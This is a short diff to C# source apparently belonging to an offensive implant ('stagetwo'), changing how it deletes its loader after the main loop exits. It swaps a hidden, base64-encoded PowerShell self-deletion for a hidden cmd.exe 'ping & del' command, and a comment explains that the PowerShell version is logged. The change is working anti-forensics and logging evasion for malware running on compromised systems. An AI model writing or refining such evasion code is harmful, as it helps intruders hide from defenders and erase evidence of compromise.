@@ -123,8 +123,8 @@ namespace stagetwo
             // Run the main loop
             protocol.Loop();
 
-            // Delete the loader after we exit
-            string command = "try { while( $true ) { Get-Process -Id " + System.Diagnostics.Process.GetCurrentProcess().Id + " -ErrorAction Stop | out-null; sleep 1 } } catch { ri -force -path \"" + path + "\"; }";
+            // The powershell seen below is logged, so we opt for cmd instead
+            /* string command = "try { while( $true ) { Get-Process -Id " + System.Diagnostics.Process.GetCurrentProcess().Id + " -ErrorAction Stop | out-null; sleep 1 } } catch { ri -force -path \"" + path + "\"; }";
             command = Convert.ToBase64String(Encoding.Unicode.GetBytes(command));
 
             System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo()
@@ -133,6 +133,16 @@ namespace stagetwo
                 WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
                 CreateNoWindow = true,
                 Arguments = "-win hidden -nopro -enc " + command,
+            });*/
+
+            // Delete the loader after we exit
+            string command = "ping -n 5 127.0.0.1 & del \"" + path + "\"";
+            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo()
+            {
+                FileName = "cmd.exe",
+                WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+                Arguments = "/C " + command,
             });
 
             // I believe that the consolehost is running threads in non-background mode.
